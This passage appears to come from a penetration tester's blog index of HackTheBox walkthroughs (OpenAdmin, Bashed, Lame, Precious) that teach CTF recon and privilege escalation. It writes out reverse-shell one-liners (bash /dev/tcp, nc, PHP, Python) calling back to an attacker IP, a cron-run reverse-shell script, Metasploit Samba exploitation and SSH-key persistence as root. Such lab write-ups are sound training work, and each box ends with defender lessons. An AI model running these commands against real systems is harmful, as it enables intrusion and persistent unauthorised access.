cat /root/root.txt That was a lot of fun! It was a long box, involving many tricks. Thankfully, most of the tricks didn&rsquo;t take too long to find (just that one about using SSH instead of a reverse shell for joanna was not obvious).
I think it went well, and I can honestly say I&rsquo;ve never been seven shells deep before (I&rsquo;m counting the chisel tunnel as one):
LESSONS LEARNED Attacker Take note of everything that requires a login: services on the box, pages of a website, databases&hellip; everything: write them down. Every time you find a new credential (or just a password), review this list and try logging in to each service again using that credential. I don&rsquo;t want to admit how many times I&rsquo;ve found a password and neglected to go try that password in SSH. If you come across an RSA private key, and it is marked ENCRYPTED, you won&rsquo;t be able to use it right away. Crack it first using ssh2john + john. An SSH connection is always preferable to a reverse shell, even an upgraded one. If it seems like SSH is a possibility, go for it. If you check for listening processes using netstat -tulpn and find a listening process that is not exposed to the internet (and thus not found by your initial nmap scanning), don&rsquo;t hesitate to use chisel: it&rsquo;s much easier than it looks, once you wrap your head around it. Defender Always keep external-facing services fully updated. None of this would have been possible if it weren&rsquo;t for the initial RCE exploit against the outdated version of OpenNetAdmin. Lock down directory permissions and restrict users from accessing anything other than what is necessary. For example, there is no obvious reason for joanna to be able to sudo nano /opt/priv without a password. Hiding something as an &ldquo;internal&rdquo; service becomes completely meaningless as soon as an external attacker gains a foothold on the system. I get that internal.openadmin.htb was a bit contrived, but it is important to remember that nothing is &ldquo;internal&rdquo; once an attacker can build a tunnel. `,url:"https://4wayhandshake.github.io/walkthrough/openadmin/"},"https://4wayhandshake.github.io/walkthrough/bashed/":{title:"Bashed",tags:["Webshell","Path Abuse","Scheduled Process"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Bashed features an infosec developer&rsquo;s blog. Seemingly, the blog has just one article. That article shows a pretty huge hint for how to complete the box. Bashed is a fairly easy box, but requires a bit of careful observation after obtaining a foothold. As usual, a basic understanding of linux is an asset.
RECON I followed my typical first steps. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with my typical nmap &ldquo;init&rdquo; scan:
nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR My &ldquo;init&rdquo; nmap scan: explained This is a quick yet highly useful scan of the lower 1000 ports. I always use this first.
-sV Version detection. Ex. if port 21 is open, attempt to guess what version of FTP is running. -sC Default script scan; shorthand for --script=default -O Enable OS detection. Nmap makes its best guess to fingerprint the target. -n Disable DNS resolution: we don&rsquo;t need hostnames. Speeds up the scan greatly. -Pn Skip host discovery, which is unnecessary if we&rsquo;re targeting just one host. -oA Output results in all formats, to the nmap/init-scan directory.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 08:55 IDT Nmap scan report for 10.10.10.68 Host is up (0.17s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel&#39;s Development Site No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=6/6%OT=80%CT=1%CU=33922%PV=Y%DS=2%DC=I%G=Y%TM=647ECBAE OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11 OS:NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 334.20 seconds There is a webserver running with title &ldquo;Arrexel&rsquo;s Development Site&rdquo;. It&rsquo;s an Apache server version 2.4.18, running on Ubuntu. When I find a webserver, I go through the following strategy:
Webserver Strategy Add the target to /etc/hosts.
echo &#34;10.10.10.68 bashed.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
Download the source code &amp; extract all the links.
Omitted here because it was not helpful for this box. At a high level, this is the process I usually follow:
Use wget to download a copy of the target domain Use strings to extract all strings from the source code Use regex to parse all strings. I look for text following an href attribute and anything with http or https Perform vhost enumeration on the target.
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.68:80/ -H &#34;Host: FUZZ.bashed.htb&#34; -c -t 40 -o ./Bashed/fuzzing/vhost-bashed.htb.md -of md -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404 Perform subdomain enumeration on the target.
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://FUZZ.bashed.htb -c -t 40 -o ./Bashed/fuzzing/subdomain-bashed.htb.md -of md -timeout 4 -ic -ac Perform directory enumeration on the target domain and any domains collected in steps (3) or (4).
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://bashed.htb -A -d 1 -t 100 -T 4 --burp --smart -o ./Bashed/fuzzing/directory-bashed.htb.json For vhost and subdomain enumeration, ANY RESULTS may be important. For directory enumeration, there are many false-positives. READ THROUGH THE RESULTS MANUALLY and look for important results. I sometimes run this twice, filtering out the byte size for unimportant pages. Check each page for a form with a POST method, using the list of pages from directory enumeration. I use a handy tool called Selenium Oxide. Below is a snippet that shows how I do this:
exploit = ExploitBuilder(&#39;http&#39;, addr, use_proxy=args.proxy) with open(f&#39;./{dirname}/discovered_uris.txt&#39;, &#39;r&#39;) as f: for f_url in f: # Change subdomains if addr != f&#39;{baseurl(f_url)}:{port}&#39;: # then skip this result # [omitted] exploit.driver.maximize_window() exploit.get(f&#39;/{page(f_url)}&#39;) # Only examine sites that have a form that does a POST forms = exploit.driver.find_elements(By.CSS_SELECTOR, &#39;form[method=&#34;POST&#34;]&#39;) user = SeO2User() for frm in forms: print(f&#39;\\nExamining form: {frm.get_attribute(&#34;outerHTML&#34;)}\\n&#39;) inputs = frm.find_elements(By.CSS_SELECTOR, &#39;input&#39;) # [omitted] Note that this check could also be performed using regex, but regex parsing of HTML is really difficult and error-prone in my experience.
Do banner-grabbing on the target.
whatweb $RADDR &amp;&amp; curl -IL $RADDR Check Wappalyzer, a tool used for identifying the underlying technologies of a website. I use the official Wappalyzer plugin for firefox.
Notable results from enumeration of this box included the following:
(no vhosts) (no subdomains) http://bashed.htb/index.html http://bashed.htb/single.html http://bashed.htb/js/main.js http://bashed.htb/uploads/ http://bashed.htb/php/ http://bashed.htb/dev/ http://bashed.htb/about.html http://bashed.htb/contact.html Apache 2.4.18, Ubuntu, PHP Exploring the website The index page shows a pretty fat hint for the box: that the author&rsquo;s tool, phpbash, was developed and tested on this server. The page http://bashed.htb/single.html shows screenshots of the usage of phpbash. It appears to be a webshell used for CTFs. There is also a link to the github page for this tool.
Uploading the webshell After cloning the repo for phpbash, and noting the presense of the /uploads directory, I decided to try uploading the webshell to the site directly. Since it looked like the website accepted POSTs, I tried sending the code as a file via a post request:
curl -X POST @phpbash.php http://bashed.htb I also tried POSTing the file to http://bashed.htb/php/ and to http://bashed.htb/uploads/. All of the requests were rejected by the server. This seemed like the wrong approach, so I moved on.
Checking the /dev directory 🤤 Here I was trying to upload something, and it was there all along! Wonderful. Let&rsquo;s check it out:
FOOTHOLD www-data This is a pretty nice webshell. It has colors and even command history/recall. When entering the webshell, it is clear that this is running commands directly on the server, from the directory where the webshell was obtained. Since this is an Apache server, that directory is /var/www/html/dev and the user is the Apache user www-data.
So what can www-data do? Whenever I gain foothold on a new box, I like to take the following steps:
Linux foothold strategy (aka &ldquo;new user, who dis?&rdquo;) Run id. Find out what groups this user is in. Locate the user within /etc/passwd if possible; see if they have a shell and/or home directory.
id &amp;&amp; cat /etc/passwd | grep $USER Check if the user can sudo
sudo -l Check locations that are writable by the user or its group
find / -user [username] 2&gt;/dev/null find / -group [groupname] 2&gt;/dev/null Does the user already have any useful tools?
which nc netcat socat python perl php Check for any active and listening sockets
netstat -tulpn | grep LISTEN ☝️ also try netstat -antp
Does the user have anything in cron?
crontab -l Does the system or root have anything in cron?
cat /etc/crontab ls -laR /etc/cron* Find any SUID or SGID executables that are accessible by the user
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39; Download the toolbox (not covered in-depth here).
My toolbox includes linpeas, linenum, pspy, and chisel.
Since HTB boxes are not connected to the internet, I usually get my tools onto the target box by standing up a python webserver and using any available tool (nc, wget, or curl) to download the tools from my attacker machine onto the target box. I also use this webserver for moving exploit code from my attacker box onto the target.
I&rsquo;ve prepared a small toolbox for myself, including a short index.html page, that is generally applicable for any CTF box. I suggest any reader of this walkthough does the same.
Run pspy and take a look at any running processes. Since pspy is closed with ctrl+c, and your reverse shell may not be fully interactive, it is best to run this on a timeout:
timeout 5m ./pspy Run pre-scripted enumeration tools, such as LinEnum or linpeas
./LinEnum.sh ./linpeas.sh -w Notable results from the foothold strategy included the following:
(1) revealed that there are three important users on the box: www-data, scriptmanager, and arrexel. ⭐ (2) revealed that www-data is able to freely sudo as scriptmanager for anything, without a a password. (3) revealed that www-data can write to any of the typical apache directories ⭐ More importantly, (3) showed that scriptmanager can write to /scripts (not a typical directory) and their home directory /home/scriptmanager. (4) revealed that nc, netcat, python (2.7), perl, and php are all present. (9), (10), and (11) were not worth executing though the webshell. Better to run a reverse shell first. USER FLAG While there are three users on the box, it seems like the webshell&rsquo;s user (www-data) is able to access all of their home directories. To obtain the flag, just go looking for it:
cd /home locate user.txt cat /home/arrexel/user.txt ROOT FLAG It seems like scriptmanager would be more important than www-data for obtaining the root flag. After all, if the webshell user had access to the root flag, that would be a pointlessly easy box 🤔.
We can easily use www-data to run any command as scriptmanager, but this syntax becomes a bit tedious after a while:
sudo -u scriptmanager [command] It&rsquo;s much better to just make a reverse shell as scriptmanager:
Reverse shell Based on which tools are present, discovered in foothold step (4), I run through a list of useful reverse shells. These can all be found on GTFObins, along with many more.
First things first, on the attacker box make a new firewall rule to allow the reverse shell from this target:
sudo ufw allow from 10.10.10.68 to any port 4444 proto tcp Also on the attacker box, set up a netcat listener:
bash nc -lvnp 4444 ☝️ Changing to Bash (instead of my default, zsh) will set us up for success in upgrading the shell later on.
Then, on the target box, try to connect back to the attacker box:
sudo -u scriptmanager bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.10/4444 0&gt;&amp;1&#39; 👎 Nope.
&hellip;try to connect back to the attacker box:
sudo -u scriptmanager nc -e /bin/sh 10.10.14.10 4444 👎 Nope. -e flag is not supported.
&hellip; * cough * try to connect back to the attacker box??
sudo -u scriptmanager php -r &#39;$sock=fsockopen(&#34;10.10.14.10&#34;,4444);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; 👎 That&rsquo;s a hard nope, buddy.
But like&hellip; try to connect back to the attacker box..?
sudo -u scriptmanager python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.10&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; 😝 Now that&rsquo;s more like it!
But this shell is somewhat uncomfortable to use. No tab completion, colours, or command history/recall. Yuck! Let&rsquo;s fix that:
The first step is not necessary: the reverse shell that succeeded already uses bash. But it won&rsquo;t hurt to do it anyway.
Upgrading the Shell I originally learned this procedure from this blog post. It goes into much more depth, but I find that the following is usually sufficient. In only a few rare cases have I had to do more than this. This also assumes python is available on the target machine. Starting with the &ldquo;dumb&rdquo; shell, change from sh to bash:
python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; If you don&rsquo;t have access to python, try this one with perl:
perl -e &#39;exec &#34;/bin/bash&#34;&#39; Or just go straight to this:
SHELL=/bin/bash script -q /dev/null You&rsquo;ll have a better prompt now, but still no tab completion and still no ability to use things like less or vi. Let&rsquo;s fix that:
[ctrl+z] stty raw -echo fg [enter] [enter] export TERM=xterm256-color The shell will be backgrounded, then enable echo mode with stty, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours 🌈.
Privilege Escalation Having upgraded my shell, it&rsquo;s now time to circle back to a couple things:
Investigate the suspicious /scripts directory Run enumeration tools like LinEnum, linpeas, and pspy The /scripts directory has two files in it:
scriptmanager@bashed:~$ ls -la /scripts total 36 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 5 17:45 . drwxr-xr-x 23 root root 4096 Jun 2 2022 .. -rw-r--r-- 1 scriptmanager scriptmanager 216 Jun 5 17:48 test.py -rw-r--r-- 1 root root 49 Jun 5 17:48 test.txt While test.txt is owned by root and cannot be read by scriptmanager, the python file test.py can be read and modified. test.py opens test.txt for writing, writes one line, then closes it again. This is too suspicious.
LinEnum did not reveal anything groundbreaking. It pointed out the non-standard directory /scripts that I had already seen from earlier. However, this is a pretty good hint that it might be the right thing to investigate in more detail.
linpeas pointed out that the sudo version may be vulnerable. sudo --version revealed that the target box is using sudo 1.8.16. Perhaps searchsploit will have some goodies:
searchsploit sudo Indeed there is something that looks applicable:
This exploit is located at /usr/share/exploitdb/exploits/linux/local/51217.sh. On my attacker box, I copied the exploit over to the webserver I use for transferring my toolbox, then from the target box downloaded it into /home/scriptmanager and tried running it:
No dice 🎲 Unfortunately the exploit did not work. I didn&rsquo;t investigate why.
pspy showed something very interesting though. Definitely a PE vector. It showed that scripts from that suspicious /scripts directory are being executed by root, once per minute!
It looks like root will run any python script inside /scripts! That&rsquo;s wonderful. While it would be possible to simply write a python script to read the root flag and write it to an accessible location, it&rsquo;s just as easy (and so much more gratifying) to pop a root shell.
Following the same process as before, let&rsquo;s create a reverse shell as a python script inside /scripts:
First, on the attacker box, make a new firewall rule to allow the root reverse shell from this target:
sudo ufw allow from 10.10.10.68 to any port 1337 proto tcp Also on the attacker box, set up a netcat listener:
bash nc -lvnp 1337 Then save the same python reverse shell into a new python script /scripts/revshell.py:
import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&#34;10.10.14.10&#34;,1337));os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty pty.spawn(&#34;/bin/bash&#34;) On the attacker box, just wait a minute. Before long&hellip;
🎉 Behold, a shell is popped.
From there, just cat out the flag at /root/root.txt
LESSONS LEARNED Attacker Follow the procedures you set out for yourself and build up your toolset. The only surefire way to improving your red-team game is by taking notes and always learning. Trust your gut. The suspicious /scripts directory stood out to me almost immediately after gaining a foothold, and it turned out to be the PE vector. Do a quick investigation of your own before falling back on pre-written enumeration tools. It will save a lot of time in the long run, and give you an idea of what to pay attention to when you eventually run those enumeration tools. Defender As a developer, remember to start fresh when you move from development to production. Don&rsquo;t leave your tools lying around. This server was extremely vulnerable because the developer was playing around with webshells, and left their toy in the http://bashed.htb/dev/ directory. Lock down directory permissions and restrict users from accessing anything other than what is necessary. For example, there is no reason for www-data to be able to read everyone&rsquo;s home directories. Having root run a whole directory of scripts as a periodic process is a pretty bad idea. Even setting test.py as a single SUID script, and locking down the directory permissions, would have been an improvement. `,url:"https://4wayhandshake.github.io/walkthrough/bashed/"},"https://4wayhandshake.github.io/walkthrough/lame/":{title:"Lame",tags:["Samba","CVE","Metasploit"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Lame is one of the oldest boxes on HTB. Its solution is very direct: while it is a &ldquo;box&rdquo;, it is actually shorter than many &ldquo;challenges&rdquo;. It is perfect for a beginner, or someone that just wants to brush up on some more introductory pentesting skills.
RECON I followed my typical first steps. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with my typical nmap &ldquo;init&rdquo; scan:
nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR My &ldquo;init&rdquo; nmap scan: explained This is a quick yet highly useful scan of the lower 1000 ports. I always use this first.
-sV Version detection. Ex. if port 21 is open, attempt to guess what version of FTP is running. -sC Default script scan; shorthand for --script=default -O Enable OS detection. Nmap makes its best guess to fingerprint the target. -n Disable DNS resolution: we don&rsquo;t need hostnames. Speeds up the scan greatly. -Pn Skip host discovery, which is unnecessary if we&rsquo;re targeting just one host. -oA Output results in all formats, to the nmap/init-scan directory.
# Nmap 7.93 scan initiated Fri Jun 2 10:42:47 2023 as: nmap -sV -sC -O -n -Pn -oA nmap/init-scan 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up (0.18s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA) |_ 2048 5656240f211ddea72bae61b1243de8f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%) No exact OS matches for host (test conditions non-ideal). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2023-06-02T03:43:30-04:00 |_clock-skew: mean: 2h00m13s, deviation: 2h49m44s, median: 11s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 2 10:43:57 2023 -- 1 IP address (1 host up) scanned in 70.56 seconds Ok, right away we see three notable services running:
FTP, with anonymous login enabled SSH, always present on HTB boxes. Note the old version of OpenSSH though. SMB, the newer version that uses TCP as well as NetBIOS. FTP and SMB are both good leads to check out. SSH could be used for persistence but is rarely the way to gain a foothold.
FOOTHOLD Investigating FTP If you&rsquo;ve just run through the Starting Point boxes on HTB, this is probably looking eerily familiar. When anonymous login is enabled, you can just jump right in to FTP: Use the username anonymous and a blank password
But get ready for disappointment&hellip; FTP is empty:
Sometimes FTP itself can be used for command execution. Good to check if this version is vulnerable:
Hey, not bad! Let&rsquo;s try it out in metasploit. But first, since this will probably create a reverse shell, it is time to add a firewall rule to allow the target to connect back to the attacker box. Personally I use ufw:
sudo ufw allow from $RADDR to any port 4444 proto tcp Now try out the exploit in msfconsole. Search for the exploit and check the options:
Set the required option then run it:
No dice 🎲 Perhaps this was patched on the target machine. Oh well 🤷‍♂ this is only an Easy box, so it&rsquo;s probably safe to say vsftpd is investigated enough. Time to move on to the next lead.
Investigating SMB Nmap already discovered that smb is running. Let&rsquo;s see if it also has anonymous login, or if it requires credentials. Just try listing the smb shares, providing a blank password:
Nice! Anonymous login was successful. The tmp directory&rsquo;s comment makes it stand out. (IPC$ and ADMIN$ are usually present, from what I&rsquo;ve seen in other SMB configurations.)
Try checking out the contents of tmp. First, just use smbclient similar to usage of ftp:
But there&rsquo;s an even easier way: just plonk smb://10.10.10.3/tmp into the address bar of your file explorer (I use Thunar, the default file explorer of kali). You&rsquo;ll be prompted for credentials, but will also have the option of anonymous login.
The directories don&rsquo;t contain anything interesting. The log file seemed like a distraction. The only notable file is .X0-lock alongside the .X11-unix directory, which indicates that there is an active X11 session left open on the box. The lockfile shows the PID of the X11 session.
💡 I was beginning to have a vague memories of doing an X11-hijack on another box. But for that one, there was a lot more than just a dangling PID to use. Made a mental note to come back to this if I was desperate.
Alright, nothing in tmp . The other shares either seemed uninteresting or required authentication. Might be a good time to check for an easy entry by seeing if there are any exploits for this version of smb:
searchsploit smb &ndash;&gt; Nothing that looks applicable searchsploit smbd &ndash;&gt; Nope searchsploit samba &ndash;&gt; YES, lots! There&rsquo;s even a specific one for the version we&rsquo;re targetting:
Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit) | unix/remote/16320.rb 🤞 That gives some hope. This is for CVE-2007-2447. Once again, let&rsquo;s check it out in metasploit:
Set the options. Note that the LHOST should be changed to the IP of the HackTheBox vpn interface. Then check and run:
😂 Wow, ok! Not only did the exploit work, the reverse shell gained root access?! That was easy!
USER FLAG The reverse shell from msfconsole provided root access to the target machine. To find the user flag, we just need to determine what user holds the flag. I issued the following commands:
ls &ndash;&gt; we start at the root directory
cd home &ndash;&gt; Several users have a home directory
cat \`find . -name user.txt\` &ndash;&gt; Found the flag at /home/makis/user.txt and read its contents
ROOT FLAG The root flag is even easier. Since we&rsquo;re already the root user, just read the flag from where it always is:
cat /root/root.txt
EXTRA CREDIT: PERSISTENCE Ok, so that was kinda&hellip; lame &#x1f643;
Good for a little bit of practice, though! So why not try something a bit extra, and practice a useful CTF skill? Since we already have root access, let&rsquo;s establish persistence by being able to SSH into the box as root. That way, we can have all the modern niceties that SSH provides, such as colors, tab-completion, and command history.
cd /root
ls -la &ndash;&gt; Identify that the .ssh directory is present.
cd .ssh &amp;&amp; ls -laR &ndash;&gt; Note that we have access to the authorized_keys file. Go ahead and cat it out to see the contents.
This is a typical ssh file that has an entry for the public key for any pre-authorized keypair that may be used to log in as this user (in this case, root). Establishing persistence is really as easy as just copying an extra entry into authorized_keys.
First, on the attacker box, generate a new key. Make sure to set adequate permissions on the private key, or SSH will reject it:
Then cat out the contents of the file id_rsa.pub that was just generated. Copy it to the clipboard.
Next, on the target box (using the reverse shell that msfconsole opened), add a line to the authorized_keys file. Since we&rsquo;re in a not-fully-interactive (aka &ldquo;dumb&rdquo;) shell, it doesn&rsquo;t work well to simply append using vim/emacs/nano. I added the line in two steps: adding a newline character then pasting in the new entry:
Now that the public key is present inside authorized_keys, we log in to the target box from the attacker box, using ssh with the private key we just generated:
Huh? Well that&rsquo;s odd. I tried running the same thing with the -v verbose flag, and found that this was happening because my attacker box&rsquo;s SSH version is much more recent than the OpenSSH found on the target box. Since this box was released, OpenSSH deprecated the key algorithm that the target box is requesting.
No problem, a quick search indicated that it is possible to run SSH in a mode to force it to allow this old, insecure key algorithm:
┌──(kali㉿kali)-[~/Box_Notes/Lame] └─$ ssh -p 22 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i ./id_rsa root@10.10.10.3 Success! 🎉
Wait, what? root has new mail..? Alright, let&rsquo;s see what it is 😕
Oh, ok. This must be what happens all those times when I sudo something and the system tells me &ldquo;this action will be reported&rdquo; &#x1f644;
Anyway, we now have persistence, and can log in via SSH using just the key we generated. I&rsquo;d call that a success! Congrats to you for going the extra mile to upgrade your dumb shell into SSH instead 👏
LESSONS LEARNED Attacker Don&rsquo;t spend too long examining files that are likely just distractions. I spent a bit too much time looking through the \\tmp samba share. Searchsploit is your friend. When using it, try using synonyms as well. Ex. checking both smb and samba was important for this box. It&rsquo;s OK to jump right into msfconsole and try out a bunch of exploits. It can be a huge time-saver. If you&rsquo;re looking to be hardcore, be sure to read though the code for any exploit that worked and understand why it worked. Read the CVE article if one exists. Defender There is no reason to ever have anonymous login enabled for any file-share. Even a shared credential is better than none at all. Read infosec news and stay on top of the latest CVEs Perform regular updates, especially for outward-facing services or anything exposed to the internet. `,url:"https://4wayhandshake.github.io/walkthrough/lame/"},"https://4wayhandshake.github.io/walkthrough/precious/":{title:"Precious",tags:["Ruby","CVE","Plaintext Credentials","Path Abuse","Insecure Deserialization"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Precious is an Easy Linux box on HackTheBox, released on November 26, 2022. Its high rating and easy difficulty make it an attactive way to get back into HTB after a short hiatus. It prominently features the Ruby language, and usage of ruby gems - hence the name. While the foothold is fairly straightforward, the path to root takes a bit of thought!
RECON [04:00:40] Performing nmap initial scan:
nmap -sC -sV -v -n -Pn -oA ./Precious/nmap/init-scan 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 04:00 EST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 04:00 Completed NSE at 04:00, 0.00s elapsed Initiating NSE at 04:00 Completed NSE at 04:00, 0.00s elapsed Initiating NSE at 04:00 Completed NSE at 04:00, 0.00s elapsed Initiating SYN Stealth Scan at 04:00 Scanning 10.10.11.189 [1000 ports] Discovered open port 80/tcp on 10.10.11.189 Discovered open port 22/tcp on 10.10.11.189 Completed SYN Stealth Scan at 04:00, 3.27s elapsed (1000 total ports) Initiating Service scan at 04:00 Scanning 2 services on 10.10.11.189 Completed Service scan at 04:00, 6.38s elapsed (2 services on 1 host) NSE: Script scanning 10.10.11.189. Initiating NSE at 04:00 Completed NSE at 04:00, 5.44s elapsed Initiating NSE at 04:00 Completed NSE at 04:00, 0.71s elapsed Initiating NSE at 04:00 Completed NSE at 04:00, 0.00s elapsed Nmap scan report for 10.10.11.189 Host is up (0.18s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ |_http-server-header: nginx/1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. Initiating NSE at 04:00 Completed NSE at 04:00, 0.00s elapsed Initiating NSE at 04:00 Completed NSE at 04:00, 0.00s elapsed Initiating NSE at 04:00 Completed NSE at 04:00, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds Raw packets sent: 1231 (54.164KB) | Rcvd: 1000 (40.008KB) [04:00:57] Performing nmap higher-port scan:
nmap -p- --min-rate 5000 -oA ./Precious/nmap/port-scan 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 04:00 EST Warning: 10.10.11.189 giving up on port because retransmission cap hit (10). Nmap scan report for precious.htb (10.10.11.189) Host is up (0.25s latency). Not shown: 65375 closed tcp ports (reset), 158 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 40.55 seconds [04:06:26] HTTP VHost enumeration, using ffuf:
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.189:80/ -H &#34;Host: FUZZ.precious.htb&#34; -c -t 40 -o ./Precious/fuzzing/vhost-precious.htb.md -of md -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404 [no result] [04:06:55] HTTP VHost enumeration, using ffuf:
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.189:80/ -H &#34;Host: FUZZ.htb&#34; -c -t 40 -o ./Precious/fuzzing/vhost-htb.md -of md -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404 [no result] [04:07:21] HTTP Directory enumeration for precious.htb:
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://precious.htb -A -d 1 -t 100 -T 4 --burp --smart -o ./Precious/fuzzing/directory-precious.htb.json 200 GET 47l 89w 815c http://precious.htb/stylesheets/style.css 200 GET 18l 42w 483c http://precious.htb/ [04:08:44] HTTP Directory enumeration for htb:
